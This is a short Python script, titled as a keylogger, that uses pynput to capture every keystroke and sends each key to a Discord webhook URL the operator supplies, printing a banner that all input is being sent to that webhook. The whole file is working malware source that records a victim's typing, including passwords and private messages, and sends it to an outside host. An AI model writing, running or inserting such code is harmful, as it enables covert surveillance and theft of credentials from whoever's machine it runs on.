# ---------- Keylogger with Discord webhook ----------
# ---------- Import of all important modules for the project ----------
from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging
import colorama
from colorama import Fore, Back, Style
from colorama import init
from termcolor import colored
colorama.init(autoreset=True)

hook = print(Fore.GREEN + "Enter webhook URL: ", end='')
Webhook1 = input()

print(" ")

print(f"{Fore.GREEN}Keylogger started all input will be sent to your Discord webhook.")

print(" ")

print(f"{Fore.GREEN}▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼")

log_send = Webhook(Webhook1)

def on_press(key):
    logging.info(str(key))
    print(key)
    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()